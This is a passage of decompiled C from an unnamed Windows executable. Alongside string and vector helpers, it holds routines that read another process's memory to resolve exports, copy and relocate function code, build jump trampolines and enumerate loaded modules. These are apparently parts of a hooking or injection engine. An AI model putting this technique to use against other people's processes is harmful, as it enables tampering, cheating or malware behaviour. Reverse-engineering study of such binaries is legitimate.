                                        (LPCVOID)((uStack_2f0 >> 0x20) + (longlong)param_2),
                                        local_268,
                                        (longlong)pvStack_260 - (longlong)local_268 &
                                        0xfffffffffffffffc,(SIZE_T *)0x0), BVar4 != 0)) {
            uVar8 = 0;
            if ((uint)uStack_2f0 != 0) {
              do {
                memset(local_138,0,0x100);
                BVar4 = ReadProcessMemory((HANDLE)*param_1,
                                          (LPCVOID)((ulonglong)
                                                    *(uint *)((longlong)local_280 +
                                                             (ulonglong)uVar8 * 4) +
                                                   (longlong)param_2),local_138,0xff,(SIZE_T *)0x0);
                if (BVar4 != 0) {
                  sVar7 = 0xffffffffffffffff;
                  do {
                    sVar6 = sVar7 + 1;
                    lVar3 = sVar7 + 1;
                    sVar7 = sVar6;
                  } while (local_138[lVar3] != '\0');
                  sVar7 = param_3[2];
                  _Buf1 = param_3;
                  if (0xf < (ulonglong)param_3[3]) {
                    _Buf1 = (undefined8 *)*param_3;
                  }
                  if ((sVar7 == sVar6) &&
                     ((sVar7 == 0 || (iVar5 = memcmp(_Buf1,local_138,sVar7), iVar5 == 0)))) {
                    uVar2 = *(ushort *)((longlong)local_298 + (ulonglong)uVar8 * 2);
                    if (uVar2 < local_2f8._4_4_) {
                      lVar9 = (ulonglong)*(uint *)((longlong)local_268 + (ulonglong)uVar2 * 4) +
                              (longlong)param_2;
                    }
                    break;
                  }
                }
                uVar8 = uVar8 + 1;
              } while (uVar8 < (uint)uStack_2f0);
            }
          }
          FUN_14000e720(&local_268);
          FUN_140038f00(&local_298);
          FUN_14000e720(&local_280);
          return lVar9;
        }
      }
    }
  }
  return 0;
}



/* ==================================================================== */
/* FUN_140038a50 @ 140038a50 */

int FUN_140038a50(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  undefined8 *puVar2;
  undefined8 local_res18;
  undefined8 local_res20;

  local_res18 = param_3;
  local_res20 = param_4;
  puVar2 = (undefined8 *)FUN_14000ea90();
  iVar1 = __stdio_common_vswprintf_s(*puVar2,param_1,0x40,param_2,0,&local_res18);
  if (iVar1 < 0) {
    iVar1 = -1;
  }
  return iVar1;
}



/* ==================================================================== */
/* FUN_140038ac0 @ 140038ac0 */

longlong * FUN_140038ac0(longlong *param_1,void *param_2,ulonglong param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  void *pvVar3;
  void *_Dst;
  ulonglong uVar4;
  void *_Memory;
  ulonglong uVar5;
  longlong *_Dst_00;

  uVar2 = param_1[3];
  if (uVar2 < param_3) {
    uVar5 = 0x7ffffffffffffffe;
    if (0x7ffffffffffffffe < param_3) {
                    /* WARNING: Subroutine does not return */
      FUN_14000eb00();
    }
    uVar4 = param_3 | 7;
    if ((uVar4 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) {
      uVar1 = uVar2 + (uVar2 >> 1);
      uVar5 = uVar4;
      if (uVar4 < uVar1) {
        uVar5 = uVar1;
      }
      uVar4 = uVar5 + 1;
      if (0x7fffffffffffffff < uVar4) {
                    /* WARNING: Subroutine does not return */
        FUN_140009c90();
      }
    }
    else {
      uVar4 = 0x7fffffffffffffff;
    }
    _Dst = (void *)FUN_14000e6b0(uVar4 * 2);
    param_1[3] = uVar5;
    param_1[2] = param_3;
    memcpy(_Dst,param_2,param_3 * 2);
    *(undefined2 *)(param_3 * 2 + (longlong)_Dst) = 0;
    if (7 < uVar2) {
      pvVar3 = (void *)*param_1;
      _Memory = pvVar3;
      if ((0xfff < uVar2 * 2 + 2) &&
         (_Memory = *(void **)((longlong)pvVar3 + -8),
         0x1f < (ulonglong)((longlong)pvVar3 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
        _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      free(_Memory);
    }
    *param_1 = (longlong)_Dst;
  }
  else {
    _Dst_00 = param_1;
    if (7 < uVar2) {
      _Dst_00 = (longlong *)*param_1;
    }
    param_1[2] = param_3;
    memmove(_Dst_00,param_2,param_3 * 2);
    *(undefined2 *)(param_3 * 2 + (longlong)_Dst_00) = 0;
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140038c10 @ 140038c10 */

undefined8 *
FUN_140038c10(undefined8 *param_1,undefined8 param_2,undefined8 param_3,undefined2 param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  ulonglong uVar3;
  void *_Src;
  size_t _Size;
  void *_Dst;
  ulonglong uVar4;
  ulonglong uVar5;
  void *_Memory;

  lVar2 = param_1[2];
  uVar5 = 0x7ffffffffffffffe;
  if (lVar2 == 0x7ffffffffffffffe) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar3 = param_1[3];
  uVar4 = lVar2 + 1U | 7;
  if ((uVar4 < 0x7fffffffffffffff) && (uVar3 <= 0x7ffffffffffffffe - (uVar3 >> 1))) {
    uVar1 = uVar3 + (uVar3 >> 1);
    uVar5 = uVar4;
    if (uVar4 < uVar1) {
      uVar5 = uVar1;
    }
    uVar4 = uVar5 + 1;
    if (0x7fffffffffffffff < uVar4) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  else {
    uVar4 = 0x7fffffffffffffff;
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 * 2);
  _Size = lVar2 * 2;
  param_1[2] = lVar2 + 1U;
  param_1[3] = uVar5;
  if (uVar3 < 8) {
    memcpy(_Dst,param_1,_Size);
    *(undefined2 *)(_Size + (longlong)_Dst) = param_4;
    *(undefined2 *)(_Size + 2 + (longlong)_Dst) = 0;
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    *(undefined2 *)(_Size + (longlong)_Dst) = param_4;
    *(undefined2 *)(_Size + 2 + (longlong)_Dst) = 0;
    _Memory = _Src;
    if ((0xfff < uVar3 * 2 + 2) &&
       (_Memory = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = _Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_140038d70 @ 140038d70 */

undefined8 *
FUN_140038d70(undefined8 *param_1,ulonglong param_2,undefined8 param_3,void *param_4,
             longlong param_5)

{
  ulonglong uVar1;
  undefined2 *puVar2;
  longlong lVar3;
  ulonglong uVar4;
  void *_Src;
  size_t _Size;
  void *_Dst;
  ulonglong uVar5;
  ulonglong uVar6;
  void *_Memory;

  lVar3 = param_1[2];
  uVar6 = 0x7ffffffffffffffe;
  if (0x7ffffffffffffffeU - lVar3 < param_2) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar4 = param_1[3];
  uVar5 = param_2 + lVar3 | 7;
  if ((uVar5 < 0x7fffffffffffffff) && (uVar4 <= 0x7ffffffffffffffe - (uVar4 >> 1))) {
    uVar1 = uVar4 + (uVar4 >> 1);
    uVar6 = uVar5;
    if (uVar5 < uVar1) {
      uVar6 = uVar1;
    }
    uVar5 = uVar6 + 1;
    if (0x7fffffffffffffff < uVar5) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  else {
    uVar5 = 0x7fffffffffffffff;
  }
  _Dst = (void *)FUN_14000e6b0(uVar5 * 2);
  param_1[2] = param_2 + lVar3;
  _Size = lVar3 * 2;
  param_1[3] = uVar6;
  puVar2 = (undefined2 *)((longlong)_Dst + (param_5 + lVar3) * 2);
  if (uVar4 < 8) {
    memcpy(_Dst,param_1,_Size);
    memcpy((void *)(_Size + (longlong)_Dst),param_4,param_5 * 2);
    *puVar2 = 0;
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    memcpy((void *)(_Size + (longlong)_Dst),param_4,param_5 * 2);
    *puVar2 = 0;
    _Memory = _Src;
    if ((0xfff < uVar4 * 2 + 2) &&
       (_Memory = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = _Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_140038f00 @ 140038f00 */

void FUN_140038f00(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  pvVar1 = (void *)*param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)((param_1[2] - (longlong)pvVar1 >> 1) * 2)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* FUN_140038f70 @ 140038f70 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

basic_ostream<char,std::char_traits<char>_> *
FUN_140038f70(basic_ostream<char,std::char_traits<char>_> *param_1,wchar_t *param_2)

{
  bool bVar1;
  _iobuf *p_Var2;
  undefined8 uVar3;
  codecvt_base *this;
  undefined8 *puVar4;
  undefined1 auStackY_a8 [32];
  int *local_48;
  char **local_40;
  char **local_38;
  longlong *local_30;
  ulonglong local_28;

  local_28 = DAT_14005d040 ^ (ulonglong)auStackY_a8;
  *(undefined **)param_1 = &DAT_140056f30;
  std::basic_ios<char,std::char_traits<char>_>::basic_ios<char,std::char_traits<char>_>
            ((basic_ios<char,std::char_traits<char>_> *)(param_1 + 0xa8));
  std::basic_ostream<char,std::char_traits<char>_>::basic_ostream<char,std::char_traits<char>_>
            (param_1,(basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8),false);
  *(undefined ***)(param_1 + *(int *)(*(longlong *)param_1 + 4)) = &PTR_LAB_1400571a0;
  *(int *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + -4) =
       *(int *)(*(longlong *)param_1 + 4) + -0xa8;
  std::basic_streambuf<char,std::char_traits<char>_>::basic_streambuf<char,std::char_traits<char>_>
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
  *(undefined ***)(param_1 + 8) = &PTR_FUN_140057120;
  param_1[0x84] = (basic_ostream<char,std::char_traits<char>_>)0x0;
  param_1[0x79] = (basic_ostream<char,std::char_traits<char>_>)0x0;
  std::basic_streambuf<char,std::char_traits<char>_>::_Init
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
  *(undefined8 *)(param_1 + 0x88) = 0;
  *(undefined8 *)(param_1 + 0x7c) = DAT_140a61890;
  *(undefined8 *)(param_1 + 0x70) = 0;
  p_Var2 = std::_Fiopen(param_2,0x22,0x40);
  if (p_Var2 == (_iobuf *)0x0) {
    std::basic_ios<char,std::char_traits<char>_>::setstate
              ((basic_ios<char,std::char_traits<char>_> *)
               (param_1 + *(int *)(*(longlong *)param_1 + 4)),2,false);
  }
  else {
    param_1[0x84] = (basic_ostream<char,std::char_traits<char>_>)0x1;
    param_1[0x79] = (basic_ostream<char,std::char_traits<char>_>)0x0;
    std::basic_streambuf<char,std::char_traits<char>_>::_Init
              ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
    local_38 = (char **)0x0;
    local_40 = (char **)0x0;
    local_48 = (int *)0x0;
    _get_stream_buffer_pointers(p_Var2,&local_38,&local_40,&local_48);
    std::basic_streambuf<char,std::char_traits<char>_>::_Init
              ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8),local_38,local_40,
               local_48,local_38,local_40,local_48);
    *(_iobuf **)(param_1 + 0x88) = p_Var2;
    *(undefined8 *)(param_1 + 0x7c) = DAT_140a61890;
    *(undefined8 *)(param_1 + 0x70) = 0;
    uVar3 = std::basic_streambuf<char,std::char_traits<char>_>::getloc
                      ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
    this = (codecvt_base *)FUN_140024db0(uVar3);
    bVar1 = std::codecvt_base::always_noconv(this);
    if (bVar1) {
      *(undefined8 *)(param_1 + 0x70) = 0;
    }
    else {
      *(codecvt_base **)(param_1 + 0x70) = this;
      std::basic_streambuf<char,std::char_traits<char>_>::_Init
                ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
    }
    if (local_30 != (longlong *)0x0) {
      puVar4 = (undefined8 *)(**(code **)(*local_30 + 0x10))();
      if (puVar4 != (undefined8 *)0x0) {
        (**(code **)*puVar4)(puVar4,1);
      }
    }
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140039180 @ 140039180 */

undefined8 * FUN_140039180(undefined8 *param_1,ulonglong param_2)

{
  ulonglong uVar1;
  size_t _Size;
  longlong lVar2;
  ulonglong uVar3;
  void *_Src;
  void *_Dst;
  ulonglong uVar4;
  ulonglong uVar5;
  void *_Memory;

  lVar2 = param_1[2];
  uVar5 = 0x7ffffffffffffffe;
  if (0x7ffffffffffffffeU - lVar2 < param_2) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar3 = param_1[3];
  uVar4 = lVar2 + param_2 | 7;
  if ((uVar4 < 0x7fffffffffffffff) && (uVar3 <= 0x7ffffffffffffffe - (uVar3 >> 1))) {
    uVar1 = uVar3 + (uVar3 >> 1);
    uVar5 = uVar4;
    if (uVar4 < uVar1) {
      uVar5 = uVar1;
    }
    uVar4 = uVar5 + 1;
    if (0x7fffffffffffffff < uVar4) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  else {
    uVar4 = 0x7fffffffffffffff;
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 * 2);
  param_1[2] = lVar2 + param_2;
  param_1[3] = uVar5;
  _Size = lVar2 * 2 + 2;
  if (uVar3 < 8) {
    memcpy(_Dst,param_1,_Size);
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    _Memory = _Src;
    if ((0xfff < uVar3 * 2 + 2) &&
       (_Memory = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = _Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_1400392c0 @ 1400392c0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 * FUN_1400392c0(undefined8 *param_1,LPCVOID param_2)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined1 auStack_88 [32];
  char local_68 [4];
  undefined4 local_64;
  undefined8 *local_60;
  _MEMORY_BASIC_INFORMATION local_58;
  ulonglong local_28;

  local_28 = DAT_14005d040 ^ (ulonglong)auStack_88;
  local_64 = 0;
  local_60 = param_1;
  VirtualQuery(param_2,&local_58,0x30);
  *param_1 = 0;
  param_1[1] = 0;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  local_64 = 1;
  if ((char *)local_58.RegionSize != (char *)0x0) {
    pcVar3 = (char *)((longlong)param_2 + 2);
    do {
      cVar1 = pcVar3[-2];
      pcVar2 = (char *)param_1[1];
      if (pcVar2 == (char *)param_1[2]) {
        local_68[0] = cVar1;
        FUN_140039620(param_1,pcVar2,local_68);
      }
      else {
        *pcVar2 = cVar1;
        param_1[1] = param_1[1] + 1;
      }
    } while ((((cVar1 != -0x34) || (pcVar3[-1] != -0x34)) || (*pcVar3 != -0x34)) &&
            (pcVar3 = pcVar3 + 1, pcVar3 + (-2 - (longlong)param_2) < local_58.RegionSize));
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_1400393b0 @ 1400393b0 */

void FUN_1400393b0(longlong *param_1,longlong param_2,longlong param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  longlong lVar4;

  lVar4 = *param_1;
  uVar3 = 0;
  do {
    if ((((byte)(*(char *)(lVar4 + uVar3) + 0xb8U) < 2) &&
        ((byte)(*(char *)(lVar4 + 1 + uVar3) + 0x48U) < 8)) &&
       (uVar2 = (ulonglong)*(uint *)(lVar4 + 2 + uVar3),
       *(longlong *)(lVar4 + 2 + uVar3) - uVar2 == param_2)) {
      *(ulonglong *)(lVar4 + 2 + uVar3) = uVar2 + param_3;
    }
    lVar4 = *param_1;
    uVar2 = *(ulonglong *)(lVar4 + 1 + uVar3);
    if (((*(char *)(lVar4 + uVar3) == -0x5f) || ((byte)(*(char *)(lVar4 + uVar3) + 0x5eU) < 2)) &&
       (uVar1 = uVar2 & 0xffffffff, uVar2 - uVar1 == param_2)) {
      *(ulonglong *)(lVar4 + 1 + uVar3) = uVar1 + param_3;
    }
    lVar4 = *param_1;
    uVar3 = uVar3 + 1;
  } while (uVar3 <= (param_1[1] - lVar4) - 10U);
  return;
}



/* ==================================================================== */
/* FUN_140039440 @ 140039440 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong * FUN_140039440(longlong *param_1,longlong param_2,longlong param_3)

{
  undefined4 *puVar1;
  undefined8 *puVar2;
  longlong lVar3;
  undefined1 auStack_58 [40];
  longlong *local_30;
  undefined8 local_28;
  undefined8 uStack_20;
  undefined8 local_18;
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStack_58;
  lVar3 = (param_3 - param_2) + -5;
  local_30 = param_1;
  if ((lVar3 < -0x80000000) || (0x7fffffff < lVar3)) {
    *param_1 = 0;
    param_1[1] = 0;
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
    puVar2 = (undefined8 *)FUN_14000e6b0(0xe);
    *param_1 = (longlong)puVar2;
    param_1[2] = (longlong)puVar2 + 0xe;
    *puVar2 = 0;
    *(undefined4 *)(puVar2 + 1) = 0;
    *(undefined2 *)((longlong)puVar2 + 0xc) = 0;
    param_1[1] = (longlong)puVar2 + 0xe;
    *(undefined1 *)*param_1 = 0xff;
    *(undefined1 *)(*param_1 + 1) = 0x25;
    *(undefined1 *)(*param_1 + 2) = 0;
    *(undefined1 *)(*param_1 + 3) = 0;
    *(undefined1 *)(*param_1 + 4) = 0;
    *(undefined1 *)(*param_1 + 5) = 0;
    *(longlong *)(*param_1 + 6) = param_3;
  }
  else {
    local_18 = 0;
    local_28 = 0;
    uStack_20 = 0;
    puVar1 = (undefined4 *)FUN_14000e6b0(5);
    *puVar1 = 0;
    *(undefined1 *)(puVar1 + 1) = 0;
    *(undefined1 *)puVar1 = 0xe9;
    *(int *)((longlong)puVar1 + 1) = (int)lVar3;
    *param_1 = (longlong)puVar1;
    local_18 = 0;
    uStack_20 = 0;
    local_28 = 0;
    param_1[1] = (longlong)puVar1 + 5;
    param_1[2] = (longlong)puVar1 + 5;
    FUN_14000e3a0(&local_28);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_1400395a0 @ 1400395a0 */

longlong FUN_1400395a0(undefined8 *param_1,longlong param_2)

{
  char *pcVar1;
  ulonglong uVar2;

  pcVar1 = (char *)*param_1;
  if (pcVar1 != (char *)param_1[1]) {
    uVar2 = (longlong)param_1[1] - (longlong)pcVar1;
    if ((((0xb < uVar2) && (*pcVar1 == 'H')) && (pcVar1[1] == -0x48)) &&
       ((pcVar1[10] == -1 && (pcVar1[0xb] == -0x20)))) {
      return *(longlong *)(pcVar1 + 2);
    }
    if (uVar2 < 0xe) {
      if (uVar2 < 6) {
        if (uVar2 < 5) {
          return 0;
        }
      }
      else if (*pcVar1 == -1) {
        if (pcVar1[1] == '%') {
          return *(longlong *)((longlong)*(int *)(pcVar1 + 2) + 6 + param_2);
        }
        return 0;
      }
    }
    else if (*pcVar1 == -1) {
      if (pcVar1[1] == '%') {
        return *(longlong *)(pcVar1 + 6);
      }
      return 0;
    }
    if (*pcVar1 == -0x17) {
      return (longlong)*(int *)(pcVar1 + 1) + 5 + param_2;
    }
  }
  return 0;
}



/* ==================================================================== */
/* FUN_140039620 @ 140039620 */

undefined1 * FUN_140039620(longlong *param_1,void *param_2,undefined1 *param_3)

{
  ulonglong uVar1;
  undefined1 *puVar2;
  longlong lVar3;
  void *pvVar4;
  undefined1 *_Dst;
  ulonglong uVar5;
  undefined1 *_Dst_00;
  void *_Memory;
  ulonglong uVar6;
  size_t _Size;

  lVar3 = *param_1;
  if (param_1[1] - lVar3 == 0x7fffffffffffffff) {
                    /* WARNING: Subroutine does not return */
    FUN_14000e380();
  }
  uVar5 = param_1[2] - lVar3;
  uVar1 = (param_1[1] - lVar3) + 1;
  uVar6 = 0x7fffffffffffffff;
  if ((uVar5 <= 0x7fffffffffffffff - (uVar5 >> 1)) && (uVar6 = (uVar5 >> 1) + uVar5, uVar6 < uVar1))
  {
    uVar6 = uVar1;
  }
  _Dst = (undefined1 *)FUN_14000e6b0(uVar6);
  puVar2 = _Dst + ((longlong)param_2 - lVar3);
  *puVar2 = *param_3;
  pvVar4 = (void *)*param_1;
  if (param_2 == (void *)param_1[1]) {
    _Size = param_1[1] - (longlong)pvVar4;
    _Dst_00 = _Dst;
    param_2 = pvVar4;
  }
  else {
    memmove(_Dst,pvVar4,(longlong)param_2 - (longlong)pvVar4);
    _Dst_00 = puVar2 + 1;
    _Size = param_1[1] - (longlong)param_2;
  }
  memmove(_Dst_00,param_2,_Size);
  pvVar4 = (void *)*param_1;
  if (pvVar4 != (void *)0x0) {
    _Memory = pvVar4;
    if ((0xfff < (ulonglong)(param_1[2] - (longlong)pvVar4)) &&
       (_Memory = *(void **)((longlong)pvVar4 + -8),
       0x1f < (ulonglong)((longlong)pvVar4 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = (longlong)_Dst;
  param_1[1] = (longlong)(_Dst + uVar1);
  param_1[2] = (longlong)(_Dst + uVar6);
  return puVar2;
}



/* ==================================================================== */
/* FUN_140039760 @ 140039760 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140039760(longlong param_1)

{
  longlong *plVar1;
  short *psVar2;
  undefined8 *puVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  int iVar6;
  HANDLE hObject;
  longlong lVar7;
  longlong lVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  undefined8 *puVar11;
  ulonglong uVar12;
  undefined1 auStack_4d8 [32];
  ulonglong *local_4b8;
  undefined8 local_4a8;
  undefined8 uStack_4a0;
  ulonglong local_498;
  ulonglong uStack_490;
  ulonglong local_488;
  undefined8 local_480;
  undefined4 local_478;
  undefined1 local_474 [20];
  undefined8 local_460;
  uint local_458;
  short local_448 [520];
  ulonglong local_38;

  local_38 = DAT_14005d040 ^ (ulonglong)auStack_4d8;
  plVar1 = (longlong *)(param_1 + 0x38);
  lVar7 = *(longlong *)(param_1 + 0x40);
  lVar8 = *plVar1;
  if (lVar8 != lVar7) {
    do {
      FUN_140025000(lVar8);
      lVar8 = lVar8 + 0x30;
    } while (lVar8 != lVar7);
    *(longlong *)(param_1 + 0x40) = *plVar1;
  }
  if ((*(int *)(param_1 + 0x24) != 0) &&
     (hObject = (HANDLE)CreateToolhelp32Snapshot(0x18), hObject != (HANDLE)0xffffffffffffffff)) {
    memset(local_474,0,0x434);
    local_478 = 0x438;
    iVar6 = Module32FirstW(hObject,&local_478);
    uVar5 = local_460;
    while (iVar6 != 0) {
      uVar12 = (ulonglong)local_458;
      lVar7 = -1;
      do {
        lVar7 = lVar7 + 1;
      } while (local_448[lVar7] != 0);
      local_4a8 = (undefined8 *)0x0;
      uStack_4a0 = 0;
      local_498 = 0;
      uStack_490 = 0xf;
      local_488 = uVar12;
      local_460 = uVar5;
      if (local_448 == local_448 + lVar7) {
        local_4a8 = (undefined8 *)0x0;
      }
      else {
        uVar10 = lVar7 * 2 >> 1;
        if (0x7fffffffffffffff < uVar10) {
                    /* WARNING: Subroutine does not return */
          FUN_14000eb00();
        }
        if (0xf < uVar10) {
          uVar9 = uVar10 | 0xf;
          if (uVar9 < 0x8000000000000000) {
            if (uVar9 < 0x16) {
              uVar9 = 0x16;
            }
          }
          else {
            uVar9 = 0x7fffffffffffffff;
          }
          local_4a8 = (undefined8 *)FUN_14000e6b0(uVar9 + 1);
          uStack_490 = uVar9;
        }
        puVar11 = &local_4a8;
        if (0xf < uStack_490) {
          puVar11 = local_4a8;
        }
        psVar2 = local_448;
        puVar3 = puVar11;
        for (uVar9 = uVar10; uVar9 != 0; uVar9 = uVar9 - 1) {
          *(char *)puVar3 = (char)*psVar2;
          puVar3 = (undefined8 *)((longlong)puVar3 + 1);
          psVar2 = psVar2 + 1;
        }
        local_498 = uVar10;
        *(undefined1 *)((longlong)puVar11 + uVar10) = 0;
      }
      puVar4 = *(undefined4 **)(param_1 + 0x40);
      if (puVar4 == *(undefined4 **)(param_1 + 0x48)) {
        local_4b8 = &local_488;
        FUN_1400399e0(plVar1,puVar4,&local_4a8,&local_480);
      }
      else {
        *puVar4 = (undefined4)local_4a8;
        puVar4[1] = local_4a8._4_4_;
        puVar4[2] = (undefined4)uStack_4a0;
        puVar4[3] = uStack_4a0._4_4_;
        *(ulonglong *)(puVar4 + 4) = local_498;
        *(ulonglong *)(puVar4 + 6) = uStack_490;
        local_498 = 0;
        uStack_490 = 0xf;
        local_4a8 = (undefined8 *)((ulonglong)local_4a8 & 0xffffffffffffff00);
        *(undefined8 *)(puVar4 + 8) = uVar5;
        *(ulonglong *)(puVar4 + 10) = uVar12;
        *(longlong *)(param_1 + 0x40) = *(longlong *)(param_1 + 0x40) + 0x30;
      }
      FUN_140025000(&local_4a8);
      iVar6 = Module32NextW(hObject,&local_478);
      uVar5 = local_460;
    }
    CloseHandle(hObject);
  }
  return;
}



/* ==================================================================== */
/* FUN_1400399e0 @ 1400399e0 */

undefined8 *
FUN_1400399e0(longlong *param_1,undefined8 *param_2,undefined4 *param_3,undefined8 *param_4,
             undefined8 *param_5)

{
  ulonglong uVar1;
  undefined8 *puVar2;
  ulonglong uVar3;
  void *pvVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined8 uVar8;
  longlong lVar9;
  undefined8 *puVar10;
  undefined8 *puVar11;
  longlong lVar12;
  undefined8 *puVar13;
  longlong lVar14;
  ulonglong uVar15;
  undefined8 *puVar16;
  void *_Memory;
  undefined8 *puVar17;

  lVar9 = *param_1;
  lVar12 = ((longlong)param_2 - lVar9) / 6 + ((longlong)param_2 - lVar9 >> 0x3f);
  uVar15 = 0x555555555555555;
  lVar14 = (param_1[1] - lVar9) / 0x30;
  if (lVar14 == 0x555555555555555) {
                    /* WARNING: Subroutine does not return */
    FUN_14000e380();
  }
  uVar1 = lVar14 + 1;
  uVar3 = (param_1[2] - lVar9) / 0x30;
  if (uVar3 <= 0x555555555555555 - (uVar3 >> 1)) {
    uVar3 = (uVar3 >> 1) + uVar3;
    uVar15 = uVar1;
    if (uVar1 <= uVar3) {
      uVar15 = uVar3;
    }
    if (0x555555555555555 < uVar15) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  lVar9 = FUN_14000e6b0(uVar15 * 0x30);
  puVar17 = (undefined8 *)(((lVar12 >> 3) - (lVar12 >> 0x3f)) * 0x30 + lVar9);
  *puVar17 = 0;
  puVar17[1] = 0;
  puVar17[2] = 0;
  puVar17[3] = 0;
  uVar5 = param_3[1];
  uVar6 = param_3[2];
  uVar7 = param_3[3];
  *(undefined4 *)puVar17 = *param_3;
  *(undefined4 *)((longlong)puVar17 + 4) = uVar5;
  *(undefined4 *)(puVar17 + 1) = uVar6;
  *(undefined4 *)((longlong)puVar17 + 0xc) = uVar7;
  uVar8 = *(undefined8 *)(param_3 + 6);
  puVar17[2] = *(undefined8 *)(param_3 + 4);
  puVar17[3] = uVar8;
  *(undefined8 *)(param_3 + 6) = 0xf;
  *(undefined1 *)param_3 = 0;
  *(undefined8 *)(param_3 + 4) = 0;
  puVar17[4] = *param_4;
  puVar17[5] = *param_5;
  puVar13 = (undefined8 *)param_1[1];
  puVar10 = (undefined8 *)*param_1;
  if (param_2 == puVar13) {
    if (puVar10 != puVar13) {
      puVar11 = (undefined8 *)(lVar9 + 0x18);
      do {
        puVar11[-3] = 0;
        puVar11[-2] = 0;
        puVar11[-1] = 0;
        *puVar11 = 0;
        uVar5 = *(undefined4 *)((longlong)puVar10 + 4);
        uVar6 = *(undefined4 *)(puVar10 + 1);
        uVar7 = *(undefined4 *)((longlong)puVar10 + 0xc);
        *(undefined4 *)(puVar11 + -3) = *(undefined4 *)puVar10;
        *(undefined4 *)((longlong)puVar11 + -0x14) = uVar5;
        *(undefined4 *)(puVar11 + -2) = uVar6;
        *(undefined4 *)((longlong)puVar11 + -0xc) = uVar7;
        uVar8 = puVar10[3];
        puVar11[-1] = puVar10[2];
        *puVar11 = uVar8;
        *(undefined1 *)puVar10 = 0;
        puVar10[2] = 0;
        puVar10[3] = 0xf;
        puVar11[1] = puVar10[4];
        puVar2 = puVar10 + 5;
        puVar10 = puVar10 + 6;
        puVar11[2] = *puVar2;
        puVar11 = puVar11 + 6;
      } while (puVar10 != puVar13);
    }
  }
  else {
    if (puVar10 != param_2) {
      puVar13 = (undefined8 *)(lVar9 + 0x18);
      do {
        puVar13[-3] = 0;
        puVar13[-2] = 0;
        puVar13[-1] = 0;
        *puVar13 = 0;
        uVar5 = *(undefined4 *)((longlong)puVar10 + 4);
